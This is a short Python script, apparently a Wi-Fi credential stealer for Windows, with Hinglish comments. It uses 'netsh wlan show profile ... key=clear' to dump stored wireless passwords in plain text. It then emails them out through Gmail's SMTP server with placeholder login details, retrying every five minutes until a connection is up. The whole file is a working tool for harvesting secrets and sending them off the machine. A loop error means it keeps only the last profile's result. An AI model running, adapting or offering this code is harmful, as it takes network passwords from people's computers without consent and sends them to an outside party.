#!/usr/bin/env python                                     #Ye pata nahi kyu likha h

import subprocess, smtplib, re, time              


def send_mail(email, password, message):                  #function for sending email to yourself
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)           #setting up the smtp server at default port for TLS ie. 587
        server.starttls()
        server.login(email, password,)
        server.sendmail(email, email, message)                # can change sender or receivers address
        server.quit()
    except:
        time.sleep(300)                                         # Delay(checking every 5 mins if the internet has turned on )
        send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)    # function call to send the reports

command = "netsh wlan show profiles"                      # To show the names of all Wlan profiles stored
networks = subprocess.check_output(command, shell=True).decode('utf-8')  #.decode('utf-8') used to change its form, if not done, it returns error "that output is not a string type"
names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)  #module re is complicated shit (used to find/match/register strings)
result = ""                                                  
for name in names_list:                                   # to get the key of each network profile
    try:
        command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
    except subprocess.CalledProcessError :                # If there's a runtime error in console
        current_result = "error"
        #print("Error occurred with %s ", name)           # Ye ignore kaar bsdk.
result = result + current_result

send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)      # function call to send the reports








